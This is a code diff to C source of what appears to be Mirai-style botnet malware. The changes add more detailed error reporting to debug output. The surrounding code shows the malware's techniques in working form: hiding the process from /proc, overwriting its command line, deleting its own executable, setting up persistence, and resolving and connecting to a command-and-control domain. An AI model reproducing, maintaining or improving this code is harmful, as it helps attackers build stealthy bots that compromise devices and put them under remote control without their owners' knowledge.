@@ -162,7 +162,7 @@ void ensure() {
     int sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd == -1) {
         #ifdef DEBUG
-            printf("[main/ensure] error creating socket for esi port\n");
+            printf("[main/ensure] error creating socket for esi port: %s (errno: %d)\n", strerror(errno), errno);
         #endif
         exit(1);
         return;
@@ -176,7 +176,7 @@ void ensure() {
 
     if (bind(sockfd, (struct sockaddr *)&addr, sizeof(addr)) == -1) {
         #ifdef DEBUG
-            printf("[main/ensure] another instance is already running\n");
+            printf("[main/ensure] another instance is already running: %s (errno: %d)\n", strerror(errno), errno);
         #endif
         close(sockfd);
         exit(1);
@@ -193,7 +193,11 @@ void hide_process_from_proc() {
     char new_dir_path[256];
     snprintf(new_dir_path, sizeof(new_dir_path), "/proc/%d", pid);
 
-    rename("/proc/self", new_dir_path);
+    if (rename("/proc/self", new_dir_path) == -1) {
+        #ifdef DEBUG
+            printf("[main] failed to hide process from proc: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
+    }
 }
 
 #define MAX_CMDLINE_LENGTH 256
@@ -211,18 +215,25 @@ void hide_process() {
     char cmd_path[64];
     snprintf(cmd_path, sizeof(cmd_path), "/proc/%d/cmdline", pid);
     fd = open(cmd_path, O_WRONLY);
+    if (fd == -1) {
+        #ifdef DEBUG
+            printf("[main] failed to open cmdline for hiding: %s (errno: %d)\n", strerror(errno), errno);
+        #endif
+        return;
+    }
     if (write(fd, cmdline_name, strlen(cmdline_name)) == -1) {
         #ifdef DEBUG
-            printf("[main] failed to hide cmdline name, continuing anyway\n");
+            printf("[main] failed to hide cmdline name: %s (errno: %d)\n", strerror(errno), errno);
         #endif
     }
+    close(fd);
 }
 
 int main(int argc, char **args)
 {
     if(setpgid(0, 0) == -1) {
         #ifdef DEBUG
-            printf("[main] failed to create process group, continuing anyway\n");
+            printf("[main] failed to create process group: %s (errno: %d)\n", strerror(errno), errno);
         #endif
     } else {
         #ifdef DEBUG
@@ -343,7 +354,7 @@ int main(int argc, char **args)
         
     if (unlink(self_exe) != 0) {
         #ifdef DEBUG
-            printf("[main] failed to unlink self, continuing anyway\n");
+            printf("[main] failed to unlink self: %s (errno: %d)\n", strerror(errno), errno);
             #endif
         }
         
@@ -353,7 +364,7 @@ int main(int argc, char **args)
     } else {
         
         #ifdef DEBUG
-            printf("[main] persistence not set up, keeping original file\n");
+            printf("[main] persistence not set up: cannot install to persistent location (check permissions)\n");
         #endif
     }
 
@@ -731,7 +742,7 @@ static void resolve_cnc_addr(void) {
     entries = resolv_lookup("yourdomain.com");
         if (entries == NULL) {
             #ifdef DEBUG
-                printf("[main] Failed to resolve CNC address, retrying...\n");
+                printf("[main] Failed to resolve CNC address: %s (errno: %d), retrying...\n", strerror(errno), errno);
             #endif
             retries--;
             if (retries > 0) {
@@ -742,7 +753,7 @@ static void resolve_cnc_addr(void) {
     
     if (entries == NULL) {
         #ifdef DEBUG
-            printf("[main] Failed to resolve CNC address after retries\n");
+            printf("[main] Failed to resolve CNC address after retries: DNS lookup failed\n");
         #endif
         return;
     }
@@ -824,7 +835,7 @@ static void establish_connection(void)
     if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
     {
         #ifdef DEBUG
-            printf("[main/conn]: failed to call socket() (errno: %d)\n", errno);
+            printf("[main/conn]: failed to call socket(): %s (errno: %d)\n", strerror(errno), errno);
         #endif
         return;
     }
